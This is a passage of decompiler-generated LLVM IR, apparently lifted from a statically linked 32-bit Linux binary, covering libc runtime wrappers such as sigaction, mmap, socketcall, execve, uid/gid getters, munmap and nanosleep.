  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32 0), label %dec_label_pc_8050f9a, label %dec_label_pc_8050fca.critedge

dec_label_pc_8050f9a:                             ; preds = %dec_label_pc_8050f75, %dec_label_pc_8050f9a
  %v4_8050f9a47 = phi i32 [ %v1_8050fa1, %dec_label_pc_8050f9a ], [ 0, %dec_label_pc_8050f75 ]
  %v5_8050f9a = mul i32 %v4_8050f9a47, 4
  %v6_8050f9a = add i32 %v5_8050f9a, ptrtoint (i32* @global_var_8055100.151 to i32)
  %v7_8050f9a = inttoptr i32 %v6_8050f9a to i32*
  %v8_8050f9a = load i32, i32* %v7_8050f9a, align 4
  call void @__pseudo_call(i32 %v8_8050f9a)
  %v0_8050fa1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050fa1 = add i32 %v0_8050fa1, 1
  store i32 %v1_8050fa1, i32* %ebx.global-to-local, align 4
  %v1_8050fa2.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8050fa2 = icmp ult i32 %v1_8050fa1, %v1_8050fa2.pre
  br i1 %v7_8050fa2, label %dec_label_pc_8050f9a, label %dec_label_pc_8050fa6

dec_label_pc_8050fa6:                             ; preds = %dec_label_pc_8050f9a
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32 0), label %dec_label_pc_8050fbe, label %dec_label_pc_8050fca

dec_label_pc_8050fbe:                             ; preds = %dec_label_pc_8050fa6, %dec_label_pc_8050fbe
  %v4_8050fbe46 = phi i32 [ %v1_8050fc5, %dec_label_pc_8050fbe ], [ 0, %dec_label_pc_8050fa6 ]
  store i32 ptrtoint (i32* @global_var_8050fc5.162 to i32), i32* %stack_var_-168, align 4
  %v5_8050fbe = mul i32 %v4_8050fbe46, 4
  %v6_8050fbe = add i32 %v5_8050fbe, ptrtoint (i32* @global_var_8055100.151 to i32)
  %v7_8050fbe = inttoptr i32 %v6_8050fbe to i32*
  %v8_8050fbe = load i32, i32* %v7_8050fbe, align 4
  call void @__pseudo_call(i32 %v8_8050fbe)
  %v0_8050fc5 = load i32, i32* @ebx, align 4
  %v1_8050fc5 = add i32 %v0_8050fc5, 1
  store i32 %v1_8050fc5, i32* @ebx, align 4
  %v1_8050fc6.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8050fc6 = icmp ult i32 %v1_8050fc5, %v1_8050fc6.pre
  br i1 %v7_8050fc6, label %dec_label_pc_8050fbe, label %dec_label_pc_8050fca

dec_label_pc_8050fca.critedge:                    ; preds = %dec_label_pc_8050f75
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050fca

dec_label_pc_8050fca:                             ; preds = %dec_label_pc_8050fca.critedge, %dec_label_pc_8050fbe, %dec_label_pc_8050fa6
  %v0_8050fd3 = load i32, i32* %stack_var_-168, align 4
  %v1_8050fd3 = call i32 @__errno_location(i32 %v0_8050fd3)
  %v1_8050fd8 = inttoptr i32 %v1_8050fd3 to i32*
  store i32 0, i32* %v1_8050fd8, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8050e58)
  %v0_8051008 = load i32, i32* @eax, align 4
  %v1_805100b = call i32 @__GI_exit(i32 %v0_8051008)
  %v0_8051015 = load i32, i32* @ebx, align 4
  %v1_8051015 = inttoptr i32 %v0_8051015 to %sigcontext*
  %v2_8051015 = call i32 @sigreturn(%sigcontext* %v1_8051015)
  %v0_805101d = load i32, i32* @ebx, align 4
  %v1_805101d = inttoptr i32 %v0_805101d to %sigcontext*
  %v2_805101d = call i32 @sigreturn(%sigcontext* %v1_805101d)
  ret i32 %v2_805101d

; uselistorder directives
  uselistorder i32 %v1_8050fc5, { 1, 2, 0 }
  uselistorder i32 %v1_8050fa1, { 1, 2, 0 }
  uselistorder i32 %v2_8050ee1, { 1, 0 }
  uselistorder i32 %v1_8050ede, { 2, 1, 0 }
  uselistorder i32 %v1_8050ebd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050eba, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), { 0, 3, 1, 5, 4, 2 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8050fbe, { 1, 0 }
  uselistorder label %dec_label_pc_8050f9a, { 1, 0 }
  uselistorder label %dec_label_pc_8050f75, { 1, 0 }
  uselistorder label %dec_label_pc_8050f00, { 1, 0 }
  uselistorder label %dec_label_pc_8050ede, { 1, 0 }
  uselistorder label %dec_label_pc_8050ec6, { 1, 0 }
  uselistorder label %dec_label_pc_8050ea3, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805101f = load i32, i32* @esi, align 4
  %v0_8051020 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051035 = icmp eq i32* %arg2, null
  br i1 %v1_8051035, label %dec_label_pc_8051088, label %dec_label_pc_8051039

dec_label_pc_8051039:                             ; preds = %entry
  %v2_8051039 = load i32, i32* %arg2, align 4
  store i32 %v2_8051039, i32* %stack_var_-148, align 4
  %v1_8051042 = add i32 %tmp11, 4
  %v3_8051054 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051054 = call i32 @memcpy(i16* %v3_8051054, i32 %v1_8051042, i32 128)
  %v1_8051059 = add i32 %tmp11, 132
  %v2_8051073 = inttoptr i32 %v1_8051059 to i8*
  %v3_8051073 = load i8, i8* %v2_8051073, align 1
  %v4_8051073 = and i8 %v3_8051073, 4
  %v5_8051073 = icmp eq i8 %v4_8051073, 0
  %v1_805107a = icmp eq i1 %v5_8051073, false
  br i1 %v1_805107a, label %dec_label_pc_8051088, label %dec_label_pc_805107c

dec_label_pc_805107c:                             ; preds = %dec_label_pc_8051039
  br label %dec_label_pc_8051088

dec_label_pc_8051088:                             ; preds = %dec_label_pc_805107c, %dec_label_pc_8051039, %entry
  %v1_805108a = icmp eq i32 %arg3, 0
  br i1 %v1_805108a, label %dec_label_pc_8051092, label %dec_label_pc_805108e

dec_label_pc_805108e:                             ; preds = %dec_label_pc_8051088
  %v2_805108e = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051092

dec_label_pc_8051092:                             ; preds = %dec_label_pc_8051088, %dec_label_pc_805108e
  %v0_80510a1 = phi i32 [ 0, %dec_label_pc_8051088 ], [ %v2_805108e, %dec_label_pc_805108e ]
  br i1 %v1_8051035, label %dec_label_pc_805109f, label %dec_label_pc_8051098

dec_label_pc_8051098:                             ; preds = %dec_label_pc_8051092
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805109f

dec_label_pc_805109f:                             ; preds = %dec_label_pc_8051092, %dec_label_pc_8051098
  %v0_80510a2 = phi %sigaction* [ null, %dec_label_pc_8051092 ], [ %phitmp, %dec_label_pc_8051098 ]
  %v5_80510aa = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_80510a2, i32 %v0_80510a1, i32 8)
  store i32 %v5_80510aa, i32* %ebx.global-to-local, align 4
  br i1 %v1_805108a, label %dec_label_pc_80510ed, label %dec_label_pc_80510b8

dec_label_pc_80510b8:                             ; preds = %dec_label_pc_805109f
  %v2_80510b8 = icmp slt i32 %v5_80510aa, 0
  br i1 %v2_80510b8, label %dec_label_pc_80510ed, label %dec_label_pc_80510bc

dec_label_pc_80510bc:                             ; preds = %dec_label_pc_80510b8
  %v3_80510bc = load i32, i32* %stack_var_-288, align 4
  %v2_80510c0 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80510bc, i32* %v2_80510c0, align 4
  %v2_80510c8 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80510cd = add i32 %arg3, 4
  %v3_80510d1 = inttoptr i32 %v1_80510cd to i16*
  %v4_80510d1 = call i32 @memcpy(i16* %v3_80510d1, i32 %v2_80510c8, i32 128)
  %v2_80510da = add i32 %arg3, 132
  %v3_80510da = inttoptr i32 %v2_80510da to i32*
  %v2_80510e7 = add i32 %arg3, 136
  %v3_80510e7 = inttoptr i32 %v2_80510e7 to i32*
  %v0_80510ed.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80510ed

dec_label_pc_80510ed:                             ; preds = %dec_label_pc_80510b8, %dec_label_pc_805109f, %dec_label_pc_80510bc
  %v0_80510ed = phi i32 [ %v5_80510aa, %dec_label_pc_80510b8 ], [ %v5_80510aa, %dec_label_pc_805109f ], [ %v0_80510ed.pre, %dec_label_pc_80510bc ]
  store i32 %v0_8051020, i32* @ebx, align 4
  store i32 %v0_805101f, i32* @esi, align 4
  ret i32 %v0_80510ed

; uselistorder directives
  uselistorder i1 %v1_805108a, { 1, 0 }
  uselistorder i1 %v1_8051035, { 1, 0 }
  uselistorder i8 4, { 2, 3, 1, 0 }
  uselistorder i32 128, { 4, 5, 10, 2, 6, 7, 8, 11, 0, 12, 13, 3, 1, 9, 14 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 7, 8, 9, 1, 2 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80510ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805109f, { 1, 0 }
  uselistorder label %dec_label_pc_8051092, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_80510fb = load i32, i32* @eax, align 4
  %v1_80510fd = sub i32 0, %v0_80510fb
  %v1_80510ff = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8051104 = inttoptr i32 %v1_80510ff to i32*
  store i32 %v1_80510fd, i32* %v2_8051104, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8051110 = load i32, i32* @ebx, align 4
  %v2_8051117 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8051117, i32* @ebx, align 4
  %v8_805111b = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051110, i32* @ebx, align 4
  %v3_8051124 = icmp ugt i32 %v8_805111b, -4096
  call void @__pseudo_cond_branch(i1 %v3_8051124, i32 134549752)
  ret i32 %v8_805111b

; uselistorder directives
  uselistorder i32 %v8_805111b, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134549752, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805112c = load i32, i32* @ebx, align 4
  store i32 %v0_805112c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805113f = call i32 @int80_syscall(i32 102)
  store i32 %v1_805113f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_805113f, -4095
  br i1 %tmp8, label %dec_label_pc_8051158, label %dec_label_pc_805114c

dec_label_pc_805114c:                             ; preds = %entry
  %v0_805114c = load i32, i32* %stack_var_-4, align 4
  %v1_805114c = call i32 @__errno_location(i32 %v0_805114c)
  %v0_8051151 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051151 = sub i32 0, %v0_8051151
  %v2_8051153 = inttoptr i32 %v1_805114c to i32*
  store i32 %v1_8051151, i32* %v2_8051153, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051158

dec_label_pc_8051158:                             ; preds = %entry, %dec_label_pc_805114c
  %v0_8051158 = phi i32 [ %v1_805113f, %entry ], [ -1, %dec_label_pc_805114c ]
  %v2_805115a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805115a, i32* @edx, align 4
  %v2_805115c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805115c, i32* @ebx, align 4
  ret i32 %v0_8051158

; uselistorder directives
  uselistorder i32 %v1_805113f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051158, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051161 = load i32, i32* @esi, align 4
  store i32 %v0_8051161, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051175 = load i32, i32* @ebx, align 4
  %v7_805117d = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805117d, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_805117d, -4095
  br i1 %tmp13, label %dec_label_pc_8051195, label %dec_label_pc_8051189

dec_label_pc_8051189:                             ; preds = %entry
  %v1_8051189 = call i32 @__errno_location(i32 %v0_8051175)
  %v0_805118e = load i32, i32* %esi.global-to-local, align 4
  %v1_805118e = sub i32 0, %v0_805118e
  %v2_8051190 = inttoptr i32 %v1_8051189 to i32*
  store i32 %v1_805118e, i32* %v2_8051190, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051195

dec_label_pc_8051195:                             ; preds = %entry, %dec_label_pc_8051189
  %v0_8051195 = phi i32 [ %v7_805117d, %entry ], [ -1, %dec_label_pc_8051189 ]
  %v2_8051198 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051198, i32* @esi, align 4
  ret i32 %v0_8051195

; uselistorder directives
  uselistorder i32 %v7_805117d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051195, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805119c = load i32, i32* @ebx, align 4
  store i32 %v0_805119c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80511af = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80511af, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_80511af, -4095
  br i1 %tmp9, label %dec_label_pc_80511c8, label %dec_label_pc_80511bc

dec_label_pc_80511bc:                             ; preds = %entry
  %v0_80511bc = load i32, i32* %stack_var_-4, align 4
  %v1_80511bc = call i32 @__errno_location(i32 %v0_80511bc)
  %v0_80511c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80511c1 = sub i32 0, %v0_80511c1
  %v2_80511c3 = inttoptr i32 %v1_80511bc to i32*
  store i32 %v1_80511c1, i32* %v2_80511c3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80511c8

dec_label_pc_80511c8:                             ; preds = %entry, %dec_label_pc_80511bc
  %v0_80511c8 = phi i32 [ %v4_80511af, %entry ], [ -1, %dec_label_pc_80511bc ]
  %v2_80511ca = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80511ca, i32* @edx, align 4
  %v2_80511cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80511cc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80511c8

; uselistorder directives
  uselistorder i32 %v4_80511af, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80511c8, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_80511d0 = load i32, i32* @edi, align 4
  store i32 %v0_80511d0, i32* %stack_var_-4, align 4
  %v4_80511d4 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80511d4, i32* %edi.global-to-local, align 4
  %v0_80511e0 = load i32, i32* @ebx, align 4
  %v5_80511e8 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80511e8 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80511e8 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80511e8, [1 x i8*] %v8_80511e8)
  store i32 %v9_80511e8, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80511e8, -4095
  br i1 %tmp12, label %dec_label_pc_8051200, label %dec_label_pc_80511f4

dec_label_pc_80511f4:                             ; preds = %entry
  %v1_80511f4 = call i32 @__errno_location(i32 %v0_80511e0)
  %v0_80511f9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80511f9 = sub i32 0, %v0_80511f9
  %v2_80511fb = inttoptr i32 %v1_80511f4 to i32*
  store i32 %v1_80511f9, i32* %v2_80511fb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051200

dec_label_pc_8051200:                             ; preds = %entry, %dec_label_pc_80511f4
  %v0_8051200 = phi i32 [ %v9_80511e8, %entry ], [ -1, %dec_label_pc_80511f4 ]
  %v2_8051204 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051204, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051200

; uselistorder directives
  uselistorder i32 %v9_80511e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051200, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051208 = load i32, i32* @ebx, align 4
  store i32 %v0_8051208, i32* %stack_var_-4, align 4
  %v1_8051211 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051211, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051211, -4095
  br i1 %tmp6, label %dec_label_pc_8051228, label %dec_label_pc_805121c

dec_label_pc_805121c:                             ; preds = %entry
  %v0_805121c = load i32, i32* %stack_var_-4, align 4
  %v1_805121c = call i32 @__errno_location(i32 %v0_805121c)
  %v0_8051221 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051221 = sub i32 0, %v0_8051221
  %v2_8051223 = inttoptr i32 %v1_805121c to i32*
  store i32 %v1_8051221, i32* %v2_8051223, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051228

dec_label_pc_8051228:                             ; preds = %entry, %dec_label_pc_805121c
  %v0_8051228 = phi i32 [ %v1_8051211, %entry ], [ -1, %dec_label_pc_805121c ]
  %v2_805122c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805122c, i32* @ebx, align 4
  ret i32 %v0_8051228

; uselistorder directives
  uselistorder i32 %v1_8051211, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051228, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051230 = load i32, i32* @ebx, align 4
  store i32 %v0_8051230, i32* %stack_var_-4, align 4
  %v1_8051239 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051239, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051239, -4095
  br i1 %tmp6, label %dec_label_pc_8051250, label %dec_label_pc_8051244

dec_label_pc_8051244:                             ; preds = %entry
  %v0_8051244 = load i32, i32* %stack_var_-4, align 4
  %v1_8051244 = call i32 @__errno_location(i32 %v0_8051244)
  %v0_8051249 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051249 = sub i32 0, %v0_8051249
  %v2_805124b = inttoptr i32 %v1_8051244 to i32*
  store i32 %v1_8051249, i32* %v2_805124b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051250

dec_label_pc_8051250:                             ; preds = %entry, %dec_label_pc_8051244
  %v0_8051250 = phi i32 [ %v1_8051239, %entry ], [ -1, %dec_label_pc_8051244 ]
  %v2_8051254 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051254, i32* @ebx, align 4
  ret i32 %v0_8051250

; uselistorder directives
  uselistorder i32 %v1_8051239, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051250, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051258 = load i32, i32* @ebx, align 4
  store i32 %v0_8051258, i32* %stack_var_-4, align 4
  %v1_8051261 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051261, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051261, -4095
  br i1 %tmp6, label %dec_label_pc_8051278, label %dec_label_pc_805126c

dec_label_pc_805126c:                             ; preds = %entry
  %v0_805126c = load i32, i32* %stack_var_-4, align 4
  %v1_805126c = call i32 @__errno_location(i32 %v0_805126c)
  %v0_8051271 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051271 = sub i32 0, %v0_8051271
  %v2_8051273 = inttoptr i32 %v1_805126c to i32*
  store i32 %v1_8051271, i32* %v2_8051273, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051278

dec_label_pc_8051278:                             ; preds = %entry, %dec_label_pc_805126c
  %v0_8051278 = phi i32 [ %v1_8051261, %entry ], [ -1, %dec_label_pc_805126c ]
  %v2_805127c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805127c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051278

; uselistorder directives
  uselistorder i32 %v1_8051261, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051278, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_8051280 = load i32, i32* @global_var_805b484.157, align 4
  %v1_805128a = icmp eq i32 %v0_8051280, 0
  br i1 %v1_805128a, label %dec_label_pc_8051290, label %dec_label_pc_805128e

dec_label_pc_805128e:                             ; preds = %entry
  br label %dec_label_pc_8051290

dec_label_pc_8051290:                             ; preds = %entry, %dec_label_pc_805128e
  %storemerge = phi i32 [ %v0_8051280, %dec_label_pc_805128e ], [ 4096, %entry ]
  %v0_8051290 = phi i32 [ %v0_8051280, %dec_label_pc_805128e ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8051290

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 15, 16, 6, 14, 11, 7, 3, 12, 8, 4, 13, 9, 5, 2, 10 }
  uselistorder label %dec_label_pc_8051290, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051294 = load i32, i32* @ebx, align 4
  store i32 %v0_8051294, i32* %stack_var_-4, align 4
  %v1_805129d = call i32 @int80_syscall(i32 199)
  store i32 %v1_805129d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_805129d, -4095
  br i1 %tmp6, label %dec_label_pc_80512b4, label %dec_label_pc_80512a8

dec_label_pc_80512a8:                             ; preds = %entry
  %v0_80512a8 = load i32, i32* %stack_var_-4, align 4
  %v1_80512a8 = call i32 @__errno_location(i32 %v0_80512a8)
  %v0_80512ad = load i32, i32* %ebx.global-to-local, align 4
  %v1_80512ad = sub i32 0, %v0_80512ad
  %v2_80512af = inttoptr i32 %v1_80512a8 to i32*
  store i32 %v1_80512ad, i32* %v2_80512af, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80512b4

dec_label_pc_80512b4:                             ; preds = %entry, %dec_label_pc_80512a8
  %v0_80512b4 = phi i32 [ %v1_805129d, %entry ], [ -1, %dec_label_pc_80512a8 ]
  %v2_80512b8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80512b8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80512b4

; uselistorder directives
  uselistorder i32 %v1_805129d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80512b4, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80512bc = load i32, i32* @ebx, align 4
  store i32 %v0_80512bc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80512cf = call i32 @munmap(i32 %v0_80512bc, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80512cf, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_80512cf, -4095
  br i1 %tmp8, label %dec_label_pc_80512e8, label %dec_label_pc_80512dc

dec_label_pc_80512dc:                             ; preds = %entry
  %v0_80512dc = load i32, i32* %stack_var_-4, align 4
  %v1_80512dc = call i32 @__errno_location(i32 %v0_80512dc)
  %v0_80512e1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80512e1 = sub i32 0, %v0_80512e1
  %v2_80512e3 = inttoptr i32 %v1_80512dc to i32*
  store i32 %v1_80512e1, i32* %v2_80512e3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80512e8

dec_label_pc_80512e8:                             ; preds = %entry, %dec_label_pc_80512dc
  %v0_80512e8 = phi i32 [ %v4_80512cf, %entry ], [ -1, %dec_label_pc_80512dc ]
  %v2_80512ea = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80512ea, i32* @edx, align 4
  %v2_80512ec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80512ec, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80512e8

; uselistorder directives
  uselistorder i32 %v4_80512cf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80512e8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_80512f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80512f0, i32* %stack_var_-4, align 4
  %v4_80512f4 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_80512f4, i32* %ebx.global-to-local, align 4
  %v6_8051303 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_8051303, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8051303, -4095
  br i1 %tmp11, label %dec_label_pc_805131c, label %dec_label_pc_8051310

dec_label_pc_8051310:                             ; preds = %entry
  %v0_8051310 = load i32, i32* %stack_var_-4, align 4
  %v1_8051310 = call i32 @__errno_location(i32 %v0_8051310)
  %v0_8051315 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051315 = sub i32 0, %v0_8051315
  %v2_8051317 = inttoptr i32 %v1_8051310 to i32*
  store i32 %v1_8051315, i32* %v2_8051317, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805131c

dec_label_pc_805131c:                             ; preds = %entry, %dec_label_pc_8051310
  %v0_805131c = phi i32 [ %v6_8051303, %entry ], [ -1, %dec_label_pc_8051310 ]
  %v2_8051320 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051320, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805131c

; uselistorder directives
